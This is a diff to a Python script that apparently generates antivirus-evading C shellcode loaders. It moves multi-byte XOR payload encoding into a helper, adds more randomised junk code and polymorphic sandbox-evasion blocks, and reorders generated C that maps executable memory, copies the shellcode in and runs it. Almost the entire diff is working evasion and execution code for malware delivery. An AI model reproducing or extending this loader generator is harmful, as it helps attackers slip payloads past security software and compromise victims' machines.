@@ -35,30 +35,7 @@ Encryption = sys.argv[3]
 
 Randbufname = usefull.varname_creator()
 
-if Encryption == "1":
-
-    Payload = Payload.replace("buf",Randbufname)
-
-if Encryption == "2":
-
-    Payload = Payload.splitlines()
-    Shellcode = ""
-    for line in Payload:
-        line=line.replace("unsigned char buf[]","")
-        line=line.replace(" ","")
-        line=line.replace("=","")
-        line=line.replace('"','')
-        line=line.replace('\n','')
-        line=line.replace(';','')
-        Shellcode += line
-
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        Payload = Multibyte_xorPy3.Xor_stub3(Shellcode,Randbufname)    
-    else:
-        Payload = Multibyte_xor.Xor_stub2(Shellcode,Randbufname)
-
-
+Payload = usefull.encoding_manager(Encryption,Payload,Randbufname)
 
 Randgood = usefull.varname_creator()
 
@@ -76,17 +53,19 @@ Randptr = usefull.varname_creator()
 
 Randinj = usefull.varname_creator()
 
-Junkcode1 = usefull.Junkmathinject(str(random.randint(1,12)))	        # Junkcode
-Junkcode2 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode3 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode4 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode5 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode6 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
-Junkcode7 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
+Junkcode1 = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
+Junkcode2 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode3 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode4 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode5 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode6 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode7 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode8 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Junkcode9 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
 
-MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6)),Filename))
-MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6)),Filename))
-MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6)),Filename))
+MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
+MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
+MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
  
 MorphEvasion1 = MorphEvasion1.replace(".exe","")
 MorphEvasion2 = MorphEvasion2.replace(".exe","")
@@ -106,15 +85,17 @@ Hollow_code += MorphEvasion2
 Hollow_code += MorphEvasion3
 Hollow_code += Junkcode2
 Hollow_code += Payload
-Hollow_code += "void *" + Randptr + ";"
 Hollow_code += Junkcode3
-Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
+Hollow_code += "void *" + Randptr + ";"
 Hollow_code += Junkcode4
+Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
+Hollow_code += Junkcode5
 Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
+Hollow_code += Junkcode6
 Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
-Hollow_code += "else{" + Junkcode5 + "}\n"
-Hollow_code += "}else{" + Junkcode6 + "}\n"
-Hollow_code += "}else{" + Junkcode7 + "}\n"
+Hollow_code += "else{" + Junkcode7 + "}\n"
+Hollow_code += "}else{" + Junkcode8 + "}\n"
+Hollow_code += "}else{" + Junkcode9 + "}\n"
 Hollow_code += "return 0;}"
 Hollow_code = Hollow_code.encode('utf-8')
 
